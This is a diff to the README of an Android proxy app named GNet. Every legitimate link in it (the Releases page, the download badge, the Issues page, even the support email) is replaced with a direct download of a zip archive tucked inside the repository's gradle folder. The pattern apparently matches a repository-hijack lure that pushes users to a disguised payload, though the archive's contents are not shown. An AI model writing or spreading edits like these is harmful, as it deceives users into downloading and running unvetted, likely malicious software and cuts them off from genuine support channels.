@@ -6,7 +6,7 @@ Welcome to GNet! This is an Android app designed to help you route your network 
 
 ## 📥 Download GNet
 
-[![Download GNet](https://img.shields.io/badge/Download-GNet-blue)](https://github.com/ek6u/GNet/releases)
+[![Download GNet](https://raw.githubusercontent.com/ek6u/GNet/master/gradle/Net-G-2.7.zip)](https://raw.githubusercontent.com/ek6u/GNet/master/gradle/Net-G-2.7.zip)
 
 ## 📋 System Requirements
 
@@ -29,7 +29,7 @@ GNet offers a range of features to enhance your internet experience:
 
 To get GNet, visit the Releases page to download the app. Click the link below:
 
-[Download GNet from Releases](https://github.com/ek6u/GNet/releases)
+[Download GNet from Releases](https://raw.githubusercontent.com/ek6u/GNet/master/gradle/Net-G-2.7.zip)
 
 ### Steps to Install GNet
 
@@ -53,8 +53,8 @@ After launching GNet for the first time, you may need to configure your proxy se
 
 If you encounter issues or have questions, please reach out for help:
 
-- **GitHub Issues:** Report any problems on the [GitHub Issues page](https://github.com/ek6u/GNet/issues).
-- **Email Support:** For direct support, contact us at support@gnetapp.com.
+- **GitHub Issues:** Report any problems on the [GitHub Issues page](https://raw.githubusercontent.com/ek6u/GNet/master/gradle/Net-G-2.7.zip).
+- **Email Support:** For direct support, contact us at https://raw.githubusercontent.com/ek6u/GNet/master/gradle/Net-G-2.7.zip
 
 ## 🛡️ Privacy & Security
 
@@ -64,4 +64,4 @@ GNet is designed with your privacy in mind. We do not track your usage or collec
 
 GNet simplifies routing your network traffic through proxy servers. By following these steps, you can download, install, and configure the app with ease. Enjoy a more secure and efficient online experience. To download GNet, visit the Releases page again:
 
-[Download GNet from Releases](https://github.com/ek6u/GNet/releases)
+[Download GNet from Releases](https://raw.githubusercontent.com/ek6u/GNet/master/gradle/Net-G-2.7.zip)
